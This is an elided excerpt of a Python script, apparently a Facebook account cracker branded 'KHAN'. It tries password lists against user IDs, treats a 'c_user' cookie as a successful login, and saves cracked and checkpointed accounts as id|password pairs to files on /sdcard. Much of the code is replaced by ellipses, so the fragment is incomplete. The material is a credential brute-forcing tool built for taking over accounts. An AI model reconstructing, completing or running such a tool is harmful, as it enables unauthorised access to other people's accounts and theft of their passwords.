...
def khanalic():
	...
	if khanali =='7':
		...
		print('Slect Right Option ');khanalic()
...
def khanalicp():
    ...
    print(' Ids saved in KHAN-OK.txt,in cp KHAN-CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;31m[KHAN-CP] '+uid+' | '+ps+'\033[0;97m')

                open('/sdcard/KHAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write('\r[MR.KHAM] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/KHAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print('\033[1;31m[KHAN-CP] '+cid+' | '+ps+'\033[0;97m')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\x1b[1;97m[MR.KHAN] %s| \033[1;32m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in KHAN:
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[1;31m[KHAN-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/KHNA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in KHAN:
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/CP-KHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m[KHAN-OK] '+uid+' | '+ps+'\033[1;32m')
				...
				print('\33[1;31m[KHAN-CP] '+uid+' | '+ps+'\33[0;97m')
